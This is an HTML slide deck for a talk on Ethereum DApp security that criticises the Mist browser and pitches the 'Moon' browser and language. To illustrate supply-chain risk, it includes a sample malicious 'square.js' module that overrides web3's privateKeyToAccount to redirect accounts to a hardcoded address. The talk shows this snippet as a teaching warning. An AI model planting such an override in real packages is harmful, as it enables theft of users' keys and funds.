<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8" />
		<title>2015: Ethereum</title>
		<style>
			body {
	font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}
h1, h2, h3 {
	font-weight: 400;
	margin-bottom: 0;
}
.remark-slide-content h1 { font-size: 3em; }
.remark-slide-content h2 { font-size: 2em; }
.remark-slide-content h3 { font-size: 1.6em; }
.footnote {
	position: absolute;
	bottom: 3em;
}
li p { line-height: 1.25em; }
.red { color: #fa0000; }
.large { font-size: 2em; }
a, a > code {
	color: rgb(249, 38, 114);
	text-decoration: none;
}
code {
	background: none repeat scroll 0 0 #F8F8FF;
  border: 1px solid #DEDEDE;
  border-radius: 3px 	;
  padding: 0 0.2em;
}
.remark-code, .remark-inline-code { font-family: "Bitstream Vera Sans Mono", "Courier", monospace; }
.remark-code-line-highlighted     { background-color: #373832; }
.pull-left {
	float: left;
	width: 47%;
}
.pull-right {
	float: right;
	width: 47%;
}
.pull-right ~ p {
	clear: both;
}
#slideshow .slide .content code {
	font-size: 0.8em;
}
#slideshow .slide .content pre code {
	font-size: 0.9em;
	padding: 15px;
}
.main-title, .title {
	background: #272822;
	color: #777872;
	text-shadow: 0 0 20px #333;
}
.title h1, .title h2, .main-title h1, .main-title h2 {
	color: #f3f3f3;
	line-height: 0.8em;
}
/* Custom */
.remark-code {
	display: block;
	padding: 0.5em;
}

		</style>
	</head>
	<body>
		<textarea id="source">

### How many of you **have used** Mist?

---

### How many of you **blindly trust** it?

---

### **What is wrong with Mist?**

---

### **Mist's codebase:**

### - Huge functions, unclear types;

### - Nothing is modular;

### - Global variables everywhere;

### - Confusing process managements;

### - Crazy communication flows;

### - Huge dependencies (Meteor, Electron, Webkit);

### - 100Â MB!

---

### **What is wrong with Mist?**

### 1. The **codebase** is **fragile**.

*(mention Marc/React)*

---

### Assume Mist's codebase is perfect...

### Can we trust it?

---

### (show Mist's ACE #0)

---

### (show Mist's ACE #1)

---

### **Dependencies can still propagate zero-days!**

### Meteor, Electron, Webkit, V8...

### We can't **prove them all secure**.

---

### **What is wrong with Mist?**

### 1. The **codebase** is **fragile**.

### 2. **Huge deps** can hide **security holes**.

---

### Assume the entire browser is proven secure...

### Can we trust it now?

---

### Let's talk about JavaScript.

---

### Would you paste that code on your DApp?

```javascript
function diagonal(a, b) {
  return Math.sqrt(a * a + b * b);
};
```

---

### Would you paste that code on your DApp?

```javascript
function diagonal(a, b) {
  return Math.sqrt(a * a + b * b);
};
```

### (Actually think about it.)

---

### Of course you would!

### It just performs some math and returns a value.

### You can see it is safe by just looking at it!

```javascript
function diagonal(a, b) {
  return Math.sqrt(a * a + b * b);
};
```

---

### Now, would you paste that code on your DApp?

```javascript
// computes x * x
var square = require("square.js");

function diagonal(a, b) {
  return Math.sqrt(square(a) + square(b));
};
```

### Hint: it **passes all tests**.

---

### Of course you wouldn't!

### You do not know what `square.js` does!

```javascript
// square.js

module.exports = function square(x) {

  // mwahahahahah
  web3.eth.accounts.privateKeyToAccount = (privateKey) => {
    return {
      address: '0xFCAd0B19bB29D4674531d6f115237E16AfCE377c',
      privateKey: privateKey
    }
  };

  // Returns the square of x
  return x * x;
};
```

---

### But of course DApp devs audit all their imports!

---

### But of course DApp devs audit all their imports!

### ... right?

---

### Web3.js dependencies:

---

- web3@1.0.0-beta.24

- web3-bzz@1.0.0-beta.22

- got@7.1.0

- decompress-response@3.3.0

- mimic-response@1.0.0

- duplexer3@0.1.4

- get-stream@3.0.0

- is-plain-obj@1.1.0

- is-retry-allowed@1.1.0

- is-stream@1.1.0

- isurl@1.0.0

- has-to-string-tag-x@1.4.1

---

- has-symbol-support-x@1.4.1

- is-object@1.0.1

- lowercase-keys@1.0.0

- p-cancelable@0.3.0

- p-timeout@1.2.0

- p-finally@1.0.0

- safe-buffer@5.1.1

- timed-out@4.0.1

- url-parse-lax@1.0.0

- prepend-http@1.0.4

- url-to-options@1.0.1

- swarm-js@0.1.35

---

- buffer@5.0.8

- base64-js@1.2.1

- ieee754@1.1.8

- decompress@4.2.0

- decompress-tar@4.1.1

- file-type@5.2.0

- is-stream@1.1.0 deduped

- tar-stream@1.5.4

- bl@1.2.1

- readable-stream@2.3.3 deduped

- end-of-stream@1.4.0

- once@1.4.0 deduped

---

- readable-stream@2.3.3

- core-util-is@1.0.2

- inherits@2.0.3 deduped

- isarray@1.0.0

- process-nextick-args@1.0.7

- safe-buffer@5.1.1 deduped

- string_decoder@1.0.3

- safe-buffer@5.1.1 deduped

- util-deprecate@1.0.2

- xtend@4.0.1 deduped

- decompress-tarbz2@4.1.1

- decompress-tar@4.1.1 deduped

---

- file-type@6.2.0

- is-stream@1.1.0 deduped

- seek-bzip@1.0.5

- commander@2.8.1 deduped

- unbzip2-stream@1.2.5

- buffer@3.6.0

- base64-js@0.0.8

- ieee754@1.1.8 deduped

- isarray@1.0.0 deduped

- through@2.3.8

- decompress-targz@4.1.1

- decompress-tar@4.1.1 deduped

---

- file-type@5.2.0 deduped

- is-stream@1.1.0 deduped

- decompress-unzip@4.0.1

- file-type@3.9.0

- get-stream@2.3.1

- object-assign@4.1.1 deduped

- pinkie-promise@2.0.1

- pinkie@2.0.4

- pify@2.3.0 deduped

- yauzl@2.8.0

- buffer-crc32@0.2.13

- fd-slicer@1.0.1

---

- pend@1.2.0

- graceful-fs@4.1.11

- make-dir@1.0.0

- pify@2.3.0 deduped

- pify@2.3.0

- strip-dirs@2.1.0

- is-natural-number@4.0.1

- fs-extra@2.1.2

- graceful-fs@4.1.11 deduped

- jsonfile@2.4.0

- graceful-fs@4.1.11 deduped

- fs-promise@2.0.3

---

- any-promise@1.3.0

- fs-extra@2.1.2 deduped

- mz@2.7.0

- any-promise@1.3.0 deduped

- object-assign@4.1.1

- thenify-all@1.6.0 deduped

- thenify-all@1.6.0

- thenify@3.3.0

- any-promise@1.3.0 deduped

- got@7.1.0 deduped

- mime-types@2.1.17

- mime-db@1.30.0

---

- mkdirp-promise@5.0.1

- mkdirp@0.5.1

- minimist@0.0.8

- mock-fs@4.4.2

- setimmediate@1.0.5

- tar.gz@1.0.5

- bluebird@2.11.0

- commander@2.8.1

- graceful-readlink@1.0.1

- fstream@1.0.11

- graceful-fs@4.1.11 deduped

- inherits@2.0.3 deduped

---

- mkdirp@0.5.1 deduped

- rimraf@2.6.2

- glob@7.1.2

- fs.realpath@1.0.0

- inflight@1.0.6

- once@1.4.0 deduped

- wrappy@1.0.2 deduped

- inherits@2.0.3 deduped

- minimatch@3.0.4

- brace-expansion@1.1.8

- balanced-match@1.0.0

- concat-map@0.0.1

---

- once@1.4.0 deduped

- path-is-absolute@1.0.1

- mout@0.11.1

- tar@2.2.1

- block-stream@0.0.9

- inherits@2.0.3 deduped

- fstream@1.0.11 deduped

- inherits@2.0.3 deduped

- xhr-request-promise@0.1.2

- xhr-request@1.0.1

- buffer-to-arraybuffer@0.0.2

- tape@3.6.1

---

- deep-equal@0.2.2

- defined@0.0.0

- glob@3.2.11

- inherits@2.0.3 deduped

- minimatch@0.3.0

- lru-cache@2.7.3

- sigmund@1.0.1

- inherits@2.0.3 deduped

- object-inspect@0.4.0

- resumer@0.0.0

- through@2.3.8 deduped

- through@2.3.8 deduped

---

- object-assign@3.0.0

- query-string@2.4.2

- strict-uri-encode@1.1.0

- simple-get@1.4.3

- once@1.4.0

- wrappy@1.0.2

- unzip-response@1.0.2

- xtend@4.0.1 deduped

- timed-out@2.0.0

- url-set-query@1.0.0

- xhr@2.4.0 deduped

- underscore@1.8.3

---

- web3-core@1.0.0-beta.24

- web3-core-helpers@1.0.0-beta.24

- underscore@1.8.3 deduped

- web3-eth-iban@1.0.0-beta.24 deduped

- web3-utils@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-core-promievent@1.0.0-beta.22

- bluebird@3.3.1

- eventemitter3@1.1.1 deduped

- web3-core-subscriptions@1.0.0-beta.24 deduped

---

- web3-utils@1.0.0-beta.24 deduped

- web3-core-requestmanager@1.0.0-beta.24

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-providers-http@1.0.0-beta.24

- web3-core-helpers@1.0.0-beta.24 deduped

- xhr2@0.1.4

- web3-providers-ipc@1.0.0-beta.24

- oboe@2.1.3

- http-https@1.0.0

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

---

- web3-providers-ws@1.0.0-beta.24

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- websocket@1.0.24

- debug@2.6.9

- ms@2.0.0

- nan@2.7.0

- typedarray-to-buffer@3.1.2

- is-typedarray@1.0.0 deduped

- yaeti@0.0.6

- web3-utils@1.0.0-beta.24 deduped

- web3-eth@1.0.0-beta.24

---

- underscore@1.8.3 deduped

- web3-core@1.0.0-beta.24 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-core-subscriptions@1.0.0-beta.24

- eventemitter3@1.1.1

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-eth-abi@1.0.0-beta.24

- bn.js@4.11.6

- underscore@1.8.3 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

---

- web3-utils@1.0.0-beta.24 deduped

- web3-eth-accounts@1.0.0-beta.24

- bluebird@3.3.1

- eth-lib@0.2.5

- bn.js@4.11.8 deduped

- elliptic@6.4.0 deduped

- xhr-request-promise@0.1.2 deduped

- scrypt.js@0.2.0

- scrypt@6.0.3

- nan@2.7.0 deduped

- scryptsy@1.2.1

- pbkdf2@3.0.14

---

- create-hash@1.1.3

- cipher-base@1.0.4

- inherits@2.0.3 deduped

- safe-buffer@5.1.1 deduped

- inherits@2.0.3 deduped

- ripemd160@2.0.1 deduped

- sha.js@2.4.9 deduped

- create-hmac@1.1.6

- cipher-base@1.0.4 deduped

- create-hash@1.1.3 deduped

- inherits@2.0.3 deduped

- ripemd160@2.0.1 deduped

---

- safe-buffer@5.1.1 deduped

- sha.js@2.4.9 deduped

- ripemd160@2.0.1

- hash-base@2.0.2

- inherits@2.0.3 deduped

- inherits@2.0.3 deduped

- safe-buffer@5.1.1 deduped

- sha.js@2.4.9

- inherits@2.0.3 deduped

- safe-buffer@5.1.1 deduped

- underscore@1.8.3 deduped

- uuid@2.0.1

---

- web3-core@1.0.0-beta.24 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-utils@1.0.0-beta.24 deduped

- web3-eth-contract@1.0.0-beta.24

- underscore@1.8.3 deduped

- web3-core@1.0.0-beta.24 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-core-promievent@1.0.0-beta.22 deduped

- web3-core-subscriptions@1.0.0-beta.24 deduped

- web3-eth-abi@1.0.0-beta.24 deduped

---

- web3-utils@1.0.0-beta.24 deduped

- web3-eth-iban@1.0.0-beta.24

- bn.js@4.11.8

- web3-utils@1.0.0-beta.24 deduped

- web3-eth-personal@1.0.0-beta.24 deduped

- web3-net@1.0.0-beta.24 deduped

- web3-utils@1.0.0-beta.24 deduped

- web3-eth-personal@1.0.0-beta.24

- web3-core@1.0.0-beta.24 deduped

- web3-core-helpers@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-net@1.0.0-beta.24 deduped

---

- web3-utils@1.0.0-beta.24 deduped

- web3-net@1.0.0-beta.24

- web3-core@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-utils@1.0.0-beta.24 deduped

- web3-shh@1.0.0-beta.24

- web3-core@1.0.0-beta.24 deduped

- web3-core-method@1.0.0-beta.24 deduped

- web3-core-subscriptions@1.0.0-beta.24 deduped

- web3-net@1.0.0-beta.24 deduped

- web3-utils@1.0.0-beta.24

- bn.js@4.11.6

---

- eth-lib@0.1.27

- bn.js@4.11.8 deduped

- elliptic@6.4.0

- bn.js@4.11.8 deduped

- brorand@1.1.0

- hash.js@1.1.3

- inherits@2.0.3 deduped

- minimalistic-assert@1.0.0 deduped

- hmac-drbg@1.0.1

- hash.js@1.1.3 deduped

- minimalistic-assert@1.0.0 deduped

- minimalistic-crypto-utils@1.0.1 deduped

---

- inherits@2.0.3

- minimalistic-assert@1.0.0

- minimalistic-crypto-utils@1.0.1

- keccakjs@0.2.1

- browserify-sha3@0.0.1

- js-sha3@0.3.1

- sha3@1.2.0

- nan@2.7.0 deduped

- nano-json-stream-parser@0.1.2

- servify@0.1.12

- body-parser@1.18.2

- bytes@3.0.0

---

- content-type@1.0.4

- debug@2.6.9 deduped

- depd@1.1.1

- http-errors@1.6.2

- depd@1.1.1 deduped

- inherits@2.0.3 deduped

- setprototypeof@1.0.3

- statuses@1.4.0

- iconv-lite@0.4.19

- on-finished@2.3.0

- ee-first@1.1.1

- qs@6.5.1

---

- raw-body@2.3.2

- bytes@3.0.0 deduped

- http-errors@1.6.2 deduped

- iconv-lite@0.4.19 deduped

- unpipe@1.0.0

- type-is@1.6.15

- media-typer@0.3.0

- mime-types@2.1.17 deduped

- cors@2.8.4

- object-assign@4.1.1 deduped

- vary@1.1.2

- express@4.16.2

---

- accepts@1.3.4

- mime-types@2.1.17 deduped

- negotiator@0.6.1

- array-flatten@1.1.1

- body-parser@1.18.2 deduped

- content-disposition@0.5.2

- content-type@1.0.4 deduped

- cookie@0.3.1

- cookie-signature@1.0.6

- debug@2.6.9 deduped

- depd@1.1.1 deduped

- encodeurl@1.0.1

---

- escape-html@1.0.3

- etag@1.8.1

- finalhandler@1.1.0

- debug@2.6.9 deduped

- encodeurl@1.0.1 deduped

- escape-html@1.0.3 deduped

- on-finished@2.3.0 deduped

- parseurl@1.3.2 deduped

- statuses@1.3.1

- unpipe@1.0.0 deduped

- fresh@0.5.2

- merge-descriptors@1.0.1

---

- methods@1.1.2

- on-finished@2.3.0 deduped

- parseurl@1.3.2

- path-to-regexp@0.1.7

- proxy-addr@2.0.2

- forwarded@0.1.2

- ipaddr.js@1.5.2

- qs@6.5.1 deduped

- range-parser@1.2.0

- safe-buffer@5.1.1 deduped

- send@0.16.1

- debug@2.6.9 deduped

---

- depd@1.1.1 deduped

- destroy@1.0.4

- encodeurl@1.0.1 deduped

- escape-html@1.0.3 deduped

- etag@1.8.1 deduped

- fresh@0.5.2 deduped

- http-errors@1.6.2 deduped

- mime@1.4.1

- ms@2.0.0 deduped

- on-finished@2.3.0 deduped

- range-parser@1.2.0 deduped

- statuses@1.3.1

---

- serve-static@1.13.1

- encodeurl@1.0.1 deduped

- escape-html@1.0.3 deduped

- parseurl@1.3.2 deduped

- send@0.16.1 deduped

- setprototypeof@1.1.0

- statuses@1.3.1

- type-is@1.6.15 deduped

- utils-merge@1.0.1

- vary@1.1.2 deduped

- request@2.83.0

- aws-sign2@0.7.0

---

- aws4@1.6.0

- caseless@0.12.0

- combined-stream@1.0.5

- delayed-stream@1.0.0

- extend@3.0.1

- forever-agent@0.6.1

- form-data@2.3.1

- asynckit@0.4.0

- combined-stream@1.0.5 deduped

- mime-types@2.1.17 deduped

- har-validator@5.0.3

- ajv@5.2.3

---

- co@4.6.0

- fast-deep-equal@1.0.0

- json-schema-traverse@0.3.1

- json-stable-stringify@1.0.1

- jsonify@0.0.0

- har-schema@2.0.0

- hawk@6.0.2

- boom@4.3.1

- hoek@4.2.0 deduped

- cryptiles@3.1.2

- boom@5.2.0

- hoek@4.2.0 deduped

---

- hoek@4.2.0

- sntp@2.0.2

- hoek@4.2.0 deduped

- http-signature@1.2.0

- assert-plus@1.0.0

- jsprim@1.4.1

- assert-plus@1.0.0 deduped

- extsprintf@1.3.0

- json-schema@0.2.3

- verror@1.10.0

- assert-plus@1.0.0 deduped

- core-util-is@1.0.2 deduped

---

- extsprintf@1.3.0 deduped

- sshpk@1.13.1

- asn1@0.2.3

- assert-plus@1.0.0 deduped

- bcrypt-pbkdf@1.0.1

- tweetnacl@0.14.5 deduped

- dashdash@1.14.1

- assert-plus@1.0.0 deduped

- ecc-jsbn@0.1.1

- jsbn@0.1.1 deduped

- getpass@0.1.7

- assert-plus@1.0.0 deduped

---

- jsbn@0.1.1

- tweetnacl@0.14.5

- is-typedarray@1.0.0

- isstream@0.1.2

- json-stringify-safe@5.0.1

- mime-types@2.1.17 deduped

- oauth-sign@0.8.2

- performance-now@2.1.0

- qs@6.5.1 deduped

- safe-buffer@5.1.1 deduped

- stringstream@0.0.5

- tough-cookie@2.3.3

---

- punycode@1.4.1

- tunnel-agent@0.6.0

- safe-buffer@5.1.1 deduped

- uuid@3.1.0

- xhr@2.4.0

- global@4.3.2

- min-document@2.19.0

- dom-walk@0.1.1

- process@0.5.2

- is-function@1.0.1

- parse-headers@2.0.1

- for-each@0.3.2

---

- is-function@1.0.1 deduped

- trim@0.0.1

- xtend@4.0.1

- ws@3.2.0

- async-limiter@1.0.0

- safe-buffer@5.1.1 deduped

- ultron@1.1.0

- xhr-request-promise@0.1.2 deduped

- ethjs-unit@0.1.6

- bn.js@4.11.6

- number-to-bn@1.7.0 deduped

- number-to-bn@1.7.0

---

- bn.js@4.11.6

- strip-hex-prefix@1.0.0

- is-hex-prefixed@1.0.0

- randomhex@0.1.5

- underscore@1.8.3 deduped

- utf8@2.1.1

---

### **474** dependencies, **thousands** of files.

### **Any** of those could **be hidding this anywhere**:

```javascript
web3.eth.accounts.privateKeyToAccount = (privateKey) => {
  return {
    address: '0xFCAd0B19bB29D4674531d6f115237E16AfCE377c',
    privateKey: privateKey
  }
};
```

### How many of you actually **audited all those**?

---

### **Don't underestimate this problem!**

### Hacking a DApp's global scope is not harmless.

### - Tracking user actions;

### - Showing misleading info;

### - Turning legit DApps into phishings;

### - Blocking normal usage.

### It is not just about private keys.

### It is about making sure DApps work as intended.

---

### **What is wrong with Mist?**

### 1. The **codebase** is **fragile**.

### 2. **Huge deps** can hide **security holes**.

### 3. JavaScript doesn't have **safe modularity**.

---

### **So, what is the plan?**

---

## **The Moon Project**

### A **new browser engine** for Ethereum DApps that:

### 1. Is **unbloated** and **performant**;

### 2. Small enough to be **formally proven secure**;

### 3. Uses a scripting language with **safe imports**.

---

## **Moon-Lang**

### - Simple language for components;

### - Î»-calculus based, JIT-compiled;

### - Importing untrusted code is harmless (!);

### - 11 KB gzipped.

---


## **Moon-Browser**

### - Talks to local and remote Ethereum nodes;

### - React-like, component-based architecture;

### - Zero-memory background tabs;

### - Allows editing and forking DApps on the spot;

### - To be formalized on type theory;

### - 94 KB gzipped.

---

### **Everything is web-compatible!**

### Moon can be compiled to JavaScript / HTML5.

### You could even use it as a safe JS module system!

```javascript
const Moon = require("moon-lang")(); // 11 KB import

// - Importing libs from Moon is always safe!
const BN = await Moon.build(
  "zb2rhicqYxttrkq9mbdB6d8xtxhYTwmVdEXBhhjvQJahrDM5F" // IPFS hash
);

const x = BN.big("0x123456789abcdef123456789abcdef");
const y = BN.big("0x111111111111111111111111111111");
const z = BN.add(x)(y);

console.log(BN.hex(z));
```

---

## Demo time!

### Show:

### - Browser;

### - Editor;

### - Hash-bar;

### - Home DApp;

### - Wallet DApp.


---

## Future:

### - **Moon-Browser:** config, confirmation window, etc.

### - **Moon-Browser:** Whisper? (Security concerns.)

### - **Moon-Browser:** Native (Idris) browser.

### - **Moon-Lang:** type system?

### - **Moon-Lang:** better syntax?

### - **Moon-Lang:** More DApps!

---

### Q: Can I see it?

### A: Sure. Link: ...

---

### And, the best thing... (no slide, spoken part)

#### - It is **actually** decentralized.

#### - Go ahead and fork a DApp, make something I don't like.

#### - Once published, Moon DApps becomes public domain, and...

#### - As long as people know their hashes...

#### - They'll always be able to use it.

#### - There's nothing I or anyone else can do to stop them.

#### - Moon DApps are the trully essence of decentralization.

#### - Like DApps should be.

---

## Thank you!



		</textarea>
		<script src="remark.js"></script>
		<script>
			var slideshow = remark.create();
		</script>
		<script></script>
	</body>
</html>
